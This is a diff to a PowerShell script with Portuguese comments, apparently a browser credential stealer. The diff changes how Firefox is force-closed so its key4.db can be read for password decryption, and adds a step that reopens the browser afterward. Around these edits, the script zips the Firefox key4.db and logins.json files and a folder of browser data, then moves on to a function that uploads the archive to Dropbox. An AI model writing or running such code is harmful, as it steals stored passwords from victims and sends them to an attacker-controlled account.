@@ -537,7 +537,11 @@ Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$
 
 
 # Termina o processo firefox, para sacar a key4.db "para desencriptar as passwords"
-Get-Process -Name "firefox" | Stop-Process -Force
+# Verificar se o Firefox está aberto e fechá-lo
+$firefoxProcess = Get-Process | Where-Object { $_.ProcessName -eq "firefox" }
+if ($firefoxProcess) {
+    Stop-Process -Name "firefox"
+}
 
 # Puxa as palavra passes encriptadas do firefox
 Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TEMP\$FolderName\Dados-do-Browser\Firefox-Passwords.zip"
@@ -547,6 +551,11 @@ Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profile
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
+#Abre de novo o firefox
+# Verificar se o Firefox foi fechado anteriormente e, se sim, reabri-lo
+if (-not $firefoxProcess) {
+    Start-Process "firefox"
+}
 # Upload para a Dropbox
 
 function dropbox {
